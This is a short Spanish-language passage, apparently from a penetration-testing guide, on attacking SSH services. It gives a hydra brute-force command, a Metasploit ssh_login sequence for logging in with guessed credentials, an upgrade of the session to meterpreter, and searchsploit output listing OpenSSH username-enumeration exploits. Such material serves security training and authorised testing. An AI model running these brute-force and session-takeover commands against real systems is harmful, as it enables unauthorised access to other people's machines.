# OpenSSH

En cuanto al protocolo ssh, podemos encontrarlo de varias formas pero en este caso lo relevante es diferenciar el sistema operativo donde está funcionando.

Lo más común en ssh es que el usuario sea un usuario del sistema, por lo que si hemos obtenido nombres de usuario durante la enumeración o explotatión de otro servicio podemos lanzar un ataque de fuerza bruta con hydra:

```bash
hydra -L <USR_WORDLIST> -P <PASS_WORDLIST> <IP> <SERVICE>
```

Una vez que obtenemos las credenciales de los posibles usuarios conocidos podemos acceder mediante ssh o crear una shell remota con algún listener como los incluidos en metasploit:

```bash
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > set username <name>
msf auxiliary(scanner/ssh/ssh_login) > set password <pass>
msf auxiliary(scanner/ssh/ssh_login) > set rhosts <target_IP>
msf auxiliary(scanner/ssh/ssh_login) > run
```

Si todo va bien, se creará una sesión ssh estándar. Para mejorar la sesión a meterpreter:

```bash
sessions -u <ID>
```

Por último y dependiendo de la versión de OpenSSH, podemos encontrar en searchsploit varios exploits para enumerar usuarios de ssh.

```bash
searchsploit openssh | grep -i enumeration
OpenSSH 2.3 < 7.7 - Username Enumeration                                                        | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                  | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                            | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                            | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                           | linux/remote/40113.txt
```

[⟵ Anterior](../05_sistema.md#explotación-windows)
